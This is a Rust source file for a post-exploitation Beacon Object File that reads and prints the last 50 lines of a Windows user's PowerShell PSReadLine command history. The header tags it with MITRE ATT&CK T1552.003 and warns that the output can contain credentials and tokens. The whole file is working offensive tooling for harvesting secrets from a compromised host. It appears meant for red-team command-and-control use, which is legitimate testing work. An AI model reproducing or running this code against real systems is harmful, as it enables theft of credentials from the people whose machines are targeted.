//! # PowerShell History BOF
//!
//! Reads a bounded tail of the current user's PSReadLine console history.
//! Output can contain credentials, tokens, or other sensitive command text.
//!
//! ## MITRE ATT&CK
//! - T1552.003 - Unsecured Credentials: Bash History
//!
//! ## Arguments
//! None. Output is capped at the last 50 lines and 32 KiB.

#![no_std]

use alloc::{string::String, vec};
use rustbof::{eprintln, println};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GENERIC_READ, GetLastError, INVALID_HANDLE_VALUE},
    Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_BEGIN, FILE_SHARE_DELETE, FILE_SHARE_READ,
        FILE_SHARE_WRITE, GetFileSizeEx, OPEN_EXISTING, ReadFile, SetFilePointerEx,
    },
    System::Environment::GetEnvironmentVariableW,
};

const MAX_BYTES: usize = 32 * 1024;
const MAX_LINES: usize = 50;

fn appdata_path() -> Result<alloc::vec::Vec<u16>, u32> {
    let name: alloc::vec::Vec<u16> = "APPDATA\0".encode_utf16().collect();
    let required = unsafe { GetEnvironmentVariableW(name.as_ptr(), core::ptr::null_mut(), 0) };
    if required == 0 || required > 32760 {
        return Err(unsafe { GetLastError() });
    }

    let mut value = vec![0u16; required as usize];
    let written = unsafe { GetEnvironmentVariableW(name.as_ptr(), value.as_mut_ptr(), required) };
    if written == 0 || written >= required {
        return Err(unsafe { GetLastError() });
    }
    value.truncate(written as usize);
    value.extend(
        "\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\0".encode_utf16(),
    );
    Ok(value)
}

fn read_tail(path: &[u16]) -> Result<(String, bool), u32> {
    let handle = unsafe {
        CreateFileW(
            path.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            core::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            core::ptr::null_mut(),
        )
    };
    if handle == INVALID_HANDLE_VALUE {
        return Err(unsafe { GetLastError() });
    }

    let mut size = 0i64;
    if unsafe { GetFileSizeEx(handle, &mut size) } == 0 || size < 0 {
        let status = unsafe { GetLastError() };
        unsafe { CloseHandle(handle) };
        return Err(status);
    }

    let truncated = size as u64 > MAX_BYTES as u64;
    let read_size = core::cmp::min(size as usize, MAX_BYTES);
    if truncated {
        let offset = size - read_size as i64;
        if unsafe { SetFilePointerEx(handle, offset, core::ptr::null_mut(), FILE_BEGIN) } == 0 {
            let status = unsafe { GetLastError() };
            unsafe { CloseHandle(handle) };
            return Err(status);
        }
    }

    let mut bytes = vec![0u8; read_size];
    let mut bytes_read = 0u32;
    let success = if read_size == 0 {
        1
    } else {
        unsafe {
            ReadFile(
                handle,
                bytes.as_mut_ptr(),
                read_size as u32,
                &mut bytes_read,
                core::ptr::null_mut(),
            )
        }
    };
    let status = if success == 0 {
        unsafe { GetLastError() }
    } else {
        0
    };
    unsafe { CloseHandle(handle) };
    if success == 0 {
        return Err(status);
    }

    bytes.truncate(bytes_read as usize);
    Ok((String::from_utf8_lossy(&bytes).into_owned(), truncated))
}

#[rustbof::main]
fn main() {
    println!("PowerShell PSReadLine history");
    println!("Warning: command history may contain sensitive values.\n");

    let result = appdata_path().and_then(|path| read_tail(&path));
    match result {
        Ok((history, byte_truncated)) => {
            let total_lines = history.lines().count();
            let skip = total_lines.saturating_sub(MAX_LINES);
            let mut shown = 0usize;
            for line in history.lines().skip(skip) {
                println!("{}", line);
                shown += 1;
            }
            if shown == 0 {
                println!("<history file is empty>");
            }
            println!(
                "\nLines shown: {}{}{}",
                shown,
                if skip > 0 {
                    " | line limit reached"
                } else {
                    ""
                },
                if byte_truncated {
                    " | byte limit reached"
                } else {
                    ""
                }
            );
        }
        Err(2) | Err(3) => {
            println!("No PSReadLine console history was found for the current user.")
        }
        Err(status) => eprintln!("History read failed: 0x{:X}", status),
    }
}
